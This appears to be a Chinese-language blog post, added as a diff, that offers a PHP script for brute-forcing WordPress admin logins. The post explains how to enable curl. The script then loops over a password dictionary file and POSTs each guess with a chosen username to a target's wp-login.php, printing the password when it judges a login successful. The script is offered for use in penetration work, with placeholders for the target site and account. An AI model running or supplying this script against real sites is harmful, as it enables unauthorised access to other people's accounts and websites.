@@ -1,0 +1,47 @@
+wordpress后台暴力破解
+
+wordpress相信大家都熟悉，不知道为什么wordpress各版本对后台暴力破解问题一直不关注，闲来无事写个php脚本来跑跑。
+
+因为代码要用到curl，如何让自己的php支持curl相关函数？ 在php.ini中找到 extension = php_curl.dll ，将其前面的注释取消掉并且重启web服务就可以了。
+
+程序效率不是很高，有心人可以多加改进，将就着用吧，有些时候可能就是需要这些小脚本来提高渗透效率。
+
+代码如下：
+
+<?php
+
+//很简单的一个程序，以下保存为php，当前页面目录下放一个file.txt作为你的字典
+//from: www.mm9.com.cn by:char
+
+$listname = file('./file.txt');
+foreach($listname as $pwd){
+
+$post_data =
+array(
+'log=char', //此处写成你要破解的用户名
+'pwd='.$pwd,
+);
+
+$post_data = implode('&',$post_data);
+
+$url='http://www.XXX.com/wp-login.php'; //此处写wordpress的后台登录地址
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+ob_start();
+curl_exec($ch);
+$result = ob_get_contents() ;
+ob_end_clean();
+ob_flush();
+set_time_limit(0);
+
+if ($result == NULL)
+{
+echo "Congratulation！the password is:<font color=red>".$pwd."</font>";
+break;
+}
+
+}
+?>
